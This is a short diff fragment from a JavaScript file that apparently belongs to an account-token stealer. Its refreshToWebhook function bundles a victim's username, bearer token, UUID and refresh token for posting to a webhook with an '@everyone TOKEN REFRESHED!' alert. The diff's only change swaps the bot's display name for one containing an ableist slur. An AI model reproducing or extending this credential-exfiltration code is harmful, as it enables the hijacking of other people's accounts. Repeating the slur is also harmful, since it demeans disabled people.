@@ -279,7 +279,7 @@ async function getNewUsernameAndUUID(newBearerToken) {
 function refreshToWebhook(newUsername, newBearerToken, newUuid, newRefreshToken) {
     const url = webhook_url
     let data = {
-username: "Refreshed username",
+username: "Refreshed This Retard",
   avatar_url: "https://avatars.githubusercontent.com/u/44952349?v=4",  
 content: "@everyone TOKEN REFRESHED!",
   embeds: [
